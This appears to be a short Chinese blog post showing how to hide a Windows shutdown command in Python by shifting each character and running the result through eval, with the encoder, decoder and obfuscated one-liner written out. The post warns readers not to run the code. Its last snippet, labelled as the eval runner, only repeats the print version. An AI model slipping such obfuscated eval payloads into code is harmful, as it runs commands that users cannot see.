# Python代码藏毒

今天看到一段非常狗的代码，在这里进行记录。

这段代码一运行会直接关机

## 实例

```python
# 不要运行！！！！！
a = "^^hlonqs^^'!nr!(-rxrsdl'!rgtscnvm,r,s0/!("
eval(''.join(''.join([chr(ord(i)+1) for i in a])))
```

## 生成过程

明文代码

```python
import os
os.system("shutdown -s -t 10")



```

混淆一点点

```python
__import__("os").system("shutdown -s -t 10")
```

全部混淆

```python
# 混淆.py
a = '__import__("os").system("shutdown -s -t 10")'
b = ''.join([chr(ord(i)-1) for i in a])
print(b)

```

```bash
python.exe 混淆.py
^^hlonqs^^'!nr!(-rxrsdl'!rgtscnvm,r,s0/!(
```

解密程序

```python
a = "^^hlonqs^^'!nr!(-rxrsdl'!rgtscnvm,r,s0/!("
b = ''.join(''.join([chr(ord(i)+1) for i in a]))
print(b)
```

eval运行程序

```python
a = "^^hlonqs^^'!nr!(-rxrsdl'!rgtscnvm,r,s0/!("
b = ''.join(''.join([chr(ord(i)+1) for i in a]))
print(b)
```

